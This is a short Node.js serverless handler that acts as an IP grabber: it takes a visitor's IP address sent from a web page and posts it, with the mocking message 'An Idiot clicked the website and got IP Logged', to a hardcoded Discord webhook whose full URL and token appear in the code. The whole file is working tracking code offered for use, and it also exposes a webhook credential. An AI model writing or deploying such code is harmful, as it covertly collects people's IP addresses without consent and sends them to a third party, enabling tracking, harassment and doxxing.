const axios = require('axios');

// Replace this with your real webhook URL
const WEBHOOK_URL = 'https://discord.com/api/webhooks/1363915668231290920/g8kVvu1DoJlb2dzeitesM7tBFty1_doRqZzZhkcCOLIzofigzsJ_2lTZ2n_IRgMrOyNR';

exports.handler = async (event, context) => {
  const { ip } = JSON.parse(event.body);

  try {
    // Send IP log to the Discord webhook
    await axios.post(WEBHOOK_URL, {
      content: `An Idiot clicked the website and got IP Logged: ${ip}`,
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ message: 'IP logged successfully' }),
    };
  } catch (error) {
    console.error('Error logging IP:', error);
    return {
      statusCode: 500,
      body: JSON.stringify({ message: 'Failed to log IP' }),
    };
  }
};
